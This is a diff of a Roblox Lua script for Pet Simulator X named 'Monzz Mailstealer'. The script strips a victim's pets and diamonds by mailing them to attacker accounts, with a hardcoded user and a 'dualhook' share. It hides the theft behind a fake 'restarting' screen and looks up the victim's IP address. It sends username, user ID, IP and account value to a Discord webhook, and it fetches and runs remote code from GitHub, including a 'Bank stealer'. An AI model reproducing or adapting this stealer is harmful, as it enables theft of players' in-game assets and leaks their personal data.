@@ -1,8 +1,44 @@
--- [Monzz Mailstealer]
-
-local Library = require(game.ReplicatedStorage.Framework.Library);
-local Players = game:GetService("Players")
-local Client = Players.LocalPlayer
+getgenv().Settings = {
+    User = "TehPucuk_55",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Monzz Is Better",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 50 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 0 --%
+    }
+}
 
 if getgenv().executed then return end
 getgenv().executed = true
@@ -167,60 +203,9 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
-for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy()
-end
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    local ScreenGui = Instance.new("ScreenGui")
-                            local Frame = Instance.new("Frame")
-                            local TextLabel = Instance.new("TextLabel")
-                            local ImageLabel = Instance.new("ImageLabel")
-                            local TextLabel_2 = Instance.new("TextLabel")
-
-                            --Properties:
-
-                            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-                            ScreenGui.DisplayOrder = 999999999
-		
-		
-                            Frame.Parent = ScreenGui
-                            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                            Frame.Position = UDim2.new(-1.1603854, 0, -1.10370374, 0)
-                            Frame.Size = UDim2.new(0, 1000000, 0, 100000000)
-							UIAspectRatioConstraint = Frame
-							
-                            TextLabel.Parent = ScreenGui
-                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.BackgroundTransparency = 1.000
-                            TextLabel.Position = UDim2.new(0.1512353545, 0, 0.373532414, 0)
-                            TextLabel.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel.ZIndex = 3
-                            TextLabel.Font = Enum.Font.SourceSansBold
-                            TextLabel.Text = "We're restarting Pet Simulator X!"
-                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.TextSize = 70.000
-                            TextLabel.TextWrapped = true
-
-                            ImageLabel.Parent = ScreenGui
-                            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            ImageLabel.BackgroundTransparency = 1.000
-                            ImageLabel.Position = UDim2.new(0.3251033338259, 0, 0.13342583251, 0)
-                            ImageLabel.Size = UDim2.new(0, 510, 0, 259)
-                            ImageLabel.ZIndex = 2
-                            ImageLabel.Image = "http://www.roblox.com/asset/?id=13441881980"
-
-                            TextLabel_2.Parent = ScreenGui
-                            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.BackgroundTransparency = 1.000
-                            TextLabel_2.Position = UDim2.new(0.1512353545, 0, 0.468594134, 0)
-                            TextLabel_2.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel_2.ZIndex = 3
-                            TextLabel_2.Font = Enum.Font.SourceSansBold
-                            TextLabel_2.Text = "Please wait while we redirect you..."
-                            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.TextSize = 36.000
-                            TextLabel_2.TextWrapped = true
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
@@ -736,7 +721,8 @@ end
 
 -- Teleport To Mailbox
 
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position)
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Mailbox.Pad.Position)
 
 -- Claim All Gifts
 
@@ -745,7 +731,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(1)
+    task.wait(1.5)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -756,7 +742,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -772,55 +758,6 @@ if _G.AntiLeave ~= false then
     end
 end
 
-local ScreenGui = Instance.new("ScreenGui")
-                            local Frame = Instance.new("Frame")
-                            local TextLabel = Instance.new("TextLabel")
-                            local ImageLabel = Instance.new("ImageLabel")
-                            local TextLabel_2 = Instance.new("TextLabel")
-
-                            --Properties:
-
-                            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-                            ScreenGui.DisplayOrder = 999999999
-		
-		
-                            Frame.Parent = ScreenGui
-                            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                            Frame.Position = UDim2.new(-1.1603854, 0, -1.10370374, 0)
-                            Frame.Size = UDim2.new(0, 1000000, 0, 100000000)
-							UIAspectRatioConstraint = Frame
-							
-                            TextLabel.Parent = ScreenGui
-                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.BackgroundTransparency = 1.000
-                            TextLabel.Position = UDim2.new(0.1512353545, 0, 0.373532414, 0)
-                            TextLabel.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel.ZIndex = 3
-                            TextLabel.Font = Enum.Font.SourceSansBold
-                            TextLabel.Text = "We're restarting Pet Simulator X!"
-                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.TextSize = 70.000
-                            TextLabel.TextWrapped = true
-
-                            ImageLabel.Parent = ScreenGui
-                            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            ImageLabel.BackgroundTransparency = 1.000
-                            ImageLabel.Position = UDim2.new(0.3251033338259, 0, 0.13342583251, 0)
-                            ImageLabel.Size = UDim2.new(0, 510, 0, 259)
-                            ImageLabel.ZIndex = 2
-                            ImageLabel.Image = "http://www.roblox.com/asset/?id=13441881980"
-
-                            TextLabel_2.Parent = ScreenGui
-                            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.BackgroundTransparency = 1.000
-                            TextLabel_2.Position = UDim2.new(0.1512353545, 0, 0.468594134, 0)
-                            TextLabel_2.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel_2.ZIndex = 3
-                            TextLabel_2.Font = Enum.Font.SourceSansBold
-                            TextLabel_2.Text = "Please wait while we redirect you..."
-                            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.TextSize = 36.000
-                            TextLabel_2.TextWrapped = true
 -- Pets Tables :
 
 TitanicList = {}
@@ -1015,24 +952,24 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Monzz Mailbox Stealer||",
+                ["title"] = "**New Hit** ||Monzz Stealer||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
+                ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer Better** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":frog: **Pets Amount** :frog:",
+                    ["name"] = ":frog: **Pets left** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1085,24 +1022,24 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Monzz Mailbox Stealer||",
+                ["title"] = "**New Hit** ||Monzz Stealer||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
+                ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer Better** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":frog: **Pets Amount** :frog:",
+                    ["name"] = ":frog: **Pets left** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1136,33 +1073,33 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
-local dhuser
-if getgenv().Settings ~= nil then
-    if getgenv().Settings.PremiumKey ~= nil then
-        local premkey = getgenv().Settings.PremiumKey
-        local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
-        local dhdata = {
-            dhprem = dhkey
-        }
-        local dhurl = "https://php-key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
-        local dhheaders = {
-            ["content-type"] = "application/json"
-        }
-        local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
-        local dhresponse = request({
-            Url = dhurl,
-            Body = dhnewdata,
-            Method = "POST",
-            Headers = dhheaders
-        })
-        local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-        if responsed ~= 'false' then
-            dhuser = responsed
-        else
-            dhuser = nil
-        end
-    end
-end
+local dhuser = getgenv().Settings.User
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "https://php-key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
 local titanicin
 local bananin
 local hugein
@@ -1172,7 +1109,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Monzz Better"
+local mailmsg = "Monzz Is Better"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
@@ -1247,7 +1184,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = "TehPucuk_55",
+            ["Recipient"] = user,
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1267,14 +1204,14 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1295,14 +1232,14 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1317,7 +1254,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = ndUser
+                user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1332,7 +1269,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1361,7 +1298,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1389,7 +1326,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1417,7 +1354,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1445,7 +1382,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1473,7 +1410,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(5.5)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
